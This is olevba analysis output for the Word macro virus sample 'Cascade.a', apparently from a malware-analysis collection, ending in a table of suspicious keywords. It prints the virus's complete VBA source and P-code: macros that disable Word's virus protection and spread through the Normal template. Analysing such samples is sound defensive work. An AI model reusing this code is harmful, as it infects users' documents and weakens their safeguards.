olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cascade.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cascade.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cascade.bas 
in file: Virus.MSWord.Cascade.a - OLE stream: 'Macros/VBA/Cascade'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAN
MsgBox "Une CASCADE de lettre  va s'afficher sur votre écran...", vbInformation, "Virus Cascade"
Call PayCascade
ErrorAN:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroNormCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "Cascade" Then
        CascadeInstalled = -1
    End If
Next i
If Not CascadeInstalled Then
    ActiveDocument.VBProject.VBComponents("Cascade").Export "C:\Windows\Cascade.dll"
    NormalTemplate.VBProject.VBComponents.Import "C:\Windows\Cascade.dll"
End If
ErrorAO:
End Sub
Sub FileNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFN
    Dialogs(wdDialogFileNew).Show
MsgBox "Je suis de retour...", vbInformation, "Virus Cascade"
Call PayCascade
ErrorFN:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
NormalTemplate.VBProject.VBComponents("Cascade").Export "C:\Windows\Cascade.dll"
ActiveDocument.VBProject.VBComponents.Import "C:\Windows\Cascade.dll"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
ErrorFT:
End Sub
Sub PayCascade()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPC
Début:
Randomize
Dim Lettre$, Nombre$
Nombre$ = Int(Rnd * 26) + 1
If Nombre$ = "1" Then Lettre$ = "A"
If Nombre$ = "2" Then Lettre$ = "B"
If Nombre$ = "3" Then Lettre$ = "C"
If Nombre$ = "4" Then Lettre$ = "D"
If Nombre$ = "5" Then Lettre$ = "E"
If Nombre$ = "6" Then Lettre$ = "F"
If Nombre$ = "7" Then Lettre$ = "G"
If Nombre$ = "8" Then Lettre$ = "H"
If Nombre$ = "9" Then Lettre$ = "I"
If Nombre$ = "10" Then Lettre$ = "J"
If Nombre$ = "11" Then Lettre$ = "K"
If Nombre$ = "12" Then Lettre$ = "L"
If Nombre$ = "13" Then Lettre$ = "M"
If Nombre$ = "14" Then Lettre$ = "N"
If Nombre$ = "15" Then Lettre$ = "O"
If Nombre$ = "16" Then Lettre$ = "P"
If Nombre$ = "17" Then Lettre$ = "Q"
If Nombre$ = "18" Then Lettre$ = "R"
If Nombre$ = "19" Then Lettre$ = "S"
If Nombre$ = "20" Then Lettre$ = "T"
If Nombre$ = "21" Then Lettre$ = "U"
If Nombre$ = "22" Then Lettre$ = "V"
If Nombre$ = "23" Then Lettre$ = "W"
If Nombre$ = "24" Then Lettre$ = "X"
If Nombre$ = "25" Then Lettre$ = "Y"
If Nombre$ = "26" Then Lettre$ = "Z"
ActiveDocument.Shapes.AddTextEffect(msoTextEffect11, Lettre$, "Impact", 55#, msoFalse, msoFalse, Int(Rnd * 450), 10).Select
Pos = Int(Rnd * 50) + 10
For n = 0 To 50 Step Pos
For i = 1 To 800000
Next i
Selection.ShapeRange.IncrementTop 10 + n
Next n
GoTo Début
ErrorPC:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cascade.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1117 bytes
' Macros/VBA/Cascade - 14089 bytes
' Line #0:
' 	FuncDefn (Sub AutoNew())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAN 
' Line #6:
' 	LitStr 0x0037 "Une CASCADE de lettre  va s'afficher sur votre écran..."
' 	Ld vbInformation 
' 	LitStr 0x000D "Virus Cascade"
' 	ArgsCall MsgBox 0x0003 
' Line #7:
' 	ArgsCall (Call) PayCascade 0x0000 
' Line #8:
' 	Label ErrorAN 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Sub AutoOpen())
' Line #11:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	OnError ErrorAO 
' Line #16:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroNormCount 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroNormCount 
' 	For 
' Line #18:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Cascade"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	UMi 
' 	St CascadeInstalled 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	Ld CascadeInstalled 
' 	Not 
' 	IfBlock 
' Line #23:
' 	LitStr 0x0016 "C:\Windows\Cascade.dll"
' 	LitStr 0x0007 "Cascade"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #24:
' 	LitStr 0x0016 "C:\Windows\Cascade.dll"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Label ErrorAO 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub FileNew())
' Line #29:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #30:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #32:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #33:
' 	OnError ErrorFN 
' Line #34:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #35:
' 	LitStr 0x0014 "Je suis de retour..."
' 	Ld vbInformation 
' 	LitStr 0x000D "Virus Cascade"
' 	ArgsCall MsgBox 0x0003 
' Line #36:
' 	ArgsCall (Call) PayCascade 0x0000 
' Line #37:
' 	Label ErrorFN 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub FileSaveAs())
' Line #40:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #41:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #44:
' 	OnError ErrorFSA 
' Line #45:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #47:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	LitStr 0x0016 "C:\Windows\Cascade.dll"
' 	LitStr 0x0007 "Cascade"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #50:
' 	LitStr 0x0016 "C:\Windows\Cascade.dll"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #51:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #52:
' 	Label ErrorFSA 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub FileTemplates())
' Line #55:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #56:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #57:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #58:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #59:
' 	OnError ErrorFT 
' Line #60:
' 	Label ErrorFT 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub PayCascade())
' Line #63:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #64:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #67:
' 	OnError ErrorPC 
' Line #68:
' 	Label Début 
' Line #69:
' 	ArgsCall Read 0x0000 
' Line #70:
' 	Dim 
' 	VarDefn Lettre
' 	VarDefn Nombre
' Line #71:
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Nombre$ 
' Line #72:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St Lettre$ 
' 	EndIf 
' Line #73:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St Lettre$ 
' 	EndIf 
' Line #74:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St Lettre$ 
' 	EndIf 
' Line #75:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St Lettre$ 
' 	EndIf 
' Line #76:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St Lettre$ 
' 	EndIf 
' Line #77:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St Lettre$ 
' 	EndIf 
' Line #78:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St Lettre$ 
' 	EndIf 
' Line #79:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St Lettre$ 
' 	EndIf 
' Line #80:
' 	Ld Nombre$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St Lettre$ 
' 	EndIf 
' Line #81:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "10"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St Lettre$ 
' 	EndIf 
' Line #82:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "11"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St Lettre$ 
' 	EndIf 
' Line #83:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "12"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St Lettre$ 
' 	EndIf 
' Line #84:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St Lettre$ 
' 	EndIf 
' Line #85:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "14"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St Lettre$ 
' 	EndIf 
' Line #86:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St Lettre$ 
' 	EndIf 
' Line #87:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "16"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St Lettre$ 
' 	EndIf 
' Line #88:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "17"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St Lettre$ 
' 	EndIf 
' Line #89:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "18"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St Lettre$ 
' 	EndIf 
' Line #90:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "19"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St Lettre$ 
' 	EndIf 
' Line #91:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "20"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St Lettre$ 
' 	EndIf 
' Line #92:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "21"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St Lettre$ 
' 	EndIf 
' Line #93:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "22"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St Lettre$ 
' 	EndIf 
' Line #94:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "23"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St Lettre$ 
' 	EndIf 
' Line #95:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "24"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St Lettre$ 
' 	EndIf 
' Line #96:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "25"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St Lettre$ 
' 	EndIf 
' Line #97:
' 	Ld Nombre$ 
' 	LitStr 0x0002 "26"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St Lettre$ 
' 	EndIf 
' Line #98:
' 	Ld msoTextEffect11 
' 	Ld Lettre$ 
' 	LitStr 0x0006 "Impact"
' 	LitR8 0x0000 0x0000 0x8000 0x404B 
' 	Ld msoFalse 
' 	Ld msoFalse 
' 	Ld Rnd 
' 	LitDI2 0x01C2 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x000A 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddTextEffect 0x0008 
' 	ArgsMemCall Set 0x0000 
' Line #99:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x000A 
' 	Add 
' 	St Pos 
' Line #100:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0032 
' 	Ld Pos 
' 	ForStep 
' Line #101:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x3500 0x000C 
' 	For 
' Line #102:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	LitDI2 0x000A 
' 	Ld n 
' 	Add 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #104:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	GoTo Début 
' Line #106:
' 	Label ErrorPC 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub ToolsMacro())
' Line #109:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #110:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #111:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #112:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #113:
' 	OnError ErrorTM 
' Line #114:
' 	Label ErrorTM 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Sub ViewVBCode())
' Line #117:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #118:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #119:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #120:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #121:
' 	OnError ErrorVVBC 
' Line #122:
' 	Label ErrorVVBC 
' Line #123:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Cascade.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

